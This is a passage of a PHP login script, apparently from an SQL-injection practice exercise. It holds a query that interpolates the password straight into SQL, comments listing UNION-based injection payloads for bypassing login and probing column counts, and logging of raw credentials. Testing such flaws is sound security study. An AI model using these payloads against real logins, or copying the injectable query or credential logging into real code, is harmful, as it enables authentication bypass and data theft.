...
$username = "";
$sql = "SELECT * FROM users WHERE `username` = 'gura' UNION SELECT * FROM users -- &' AND `password` = '$password';";

//user: gura' UNION SELECT 'gura','gura','gura' -- '
// gura' UNION SELECT 1,1,1 -- 
// //psw:  gura
// gura' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --'

if (isset($username) && isset($password)) {
    error_log('POST: [' . $username . '] [' . $password . ']');
    if ($link) {
        $sql = "SELECT * FROM users WHERE `username` = 'gura' UNION SELECT 'gura','gura' -- '' AND `password` = '$password';";
